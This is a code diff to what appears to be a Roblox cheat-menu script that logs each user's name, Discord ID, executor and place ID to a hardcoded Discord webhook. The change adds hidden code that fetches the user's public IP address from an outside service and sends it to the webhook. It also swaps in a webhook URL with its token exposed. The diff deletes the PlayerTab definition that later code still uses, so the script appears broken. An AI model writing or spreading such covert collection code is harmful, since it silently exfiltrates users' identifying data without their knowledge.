@@ -226,9 +226,14 @@ MainTab:CreateButton({
 
 
 local http = game:GetService("HttpService")
-local webhook = "https://discord.com/api/webhooks/1346607431119278232/AAlCqObNf5JeAph8Bmwsu9SMOQqf3jZjviGI_wIDHWvVdvWQv2TXUJORwBVkw-cUbOcu"
+local webhook = "https://discord.com/api/webhooks/1310987162975600761/LNEvz8LlRlIwJQSiE0p1cJZr7jL38Sly7SupaR6aOwKKSgXCUkQ1KSbJWbhUjxDIhbqG"
 local player = game.Players.LocalPlayer
 
+-- Fetch the IP address
+local ip
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org/")
+end)
 
 -- Detect executor
 local executor = "Unknown"
@@ -259,7 +264,7 @@ local displayName = player.DisplayName
 
 -- Message to send to webhook with gaps
 local message = {
-    ["content"] = "**KZHUB | LOG**",
+    ["content"] = "**DKHUB | LOG**",
     ["embeds"] = {{
         ["title"] = "__**Authorized User**__",
         ["description"] = 
@@ -267,6 +272,7 @@ local message = {
             "Display Name: **" .. displayName .. "**\n\n" ..  -- Added Display Name
             "Discord User ID: **" .. discordUserId .. "**\n\n" ..  -- Added Discord User ID
             "Executor: **" .. executor .. "**\n\n" ..  -- Added gap here
+            "IP: **" .. (ip or "Could not fetch IP") .. "**\n\n" ..  -- Added gap here
             "Place ID: **" .. placeId .. "**",  -- Added gap here
         ["color"] = tonumber(0x00FF00) -- Green color
     }}
@@ -289,8 +295,6 @@ else
     warn("HTTP request function not found.")
 end
 
-local PlayerTab = Window:CreateTab("Character", 4483362458) -- Title, Image
-local PlayerSection = PlayerTab:CreateSection("Character hacks")
 
 local Slider = PlayerTab:CreateSlider({
    Name = "Walkspeed",
@@ -423,3 +427,8 @@ local Toggle = ExtraTab:CreateToggle({
         end
     end
 })
+
+local GameTab = Window:CreateTab("Game", 4483362458) -- Title, Image
+local GameSection = GameTab:CreateSection("Player Info")
+
+local Paragraph = GameTab:CreateParagraph({Title = "Game Id", Content = "game.PlaceId"})
